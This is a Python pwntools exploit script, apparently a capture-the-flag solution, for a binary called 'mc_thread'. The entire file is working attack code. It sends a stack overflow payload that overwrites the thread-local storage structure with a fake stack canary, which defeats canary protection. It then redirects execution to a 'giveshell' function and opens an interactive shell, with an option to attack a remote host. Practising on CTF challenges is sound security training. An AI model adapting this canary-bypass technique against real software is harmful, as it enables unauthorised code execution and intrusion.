#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('mc_thread')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *thread_routine+134
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    size = 0x1000
    offset = 0x100 + 8
    padding = 0x800 - (8 * 4) # offset from buffer end to TLS struct on the stack
    
    fake_canary = b"A"*8
    saved_rbp = 0xcafebabe
    return_addr = exe.sym["giveshell"]
    junk = b"C"

    fake_tls = flat(
        [
            0xdeadbeef,
            0x404140,
            0x404140,
            0,
            0,
            fake_canary
        ]
    )

    payload = b"B"*offset + fake_canary + p64(saved_rbp) + p64(return_addr) + (junk * padding)  + fake_tls

    io.sendlineafter(b"Size:", str(size).encode())
    io.sendlineafter(b"Data:", payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

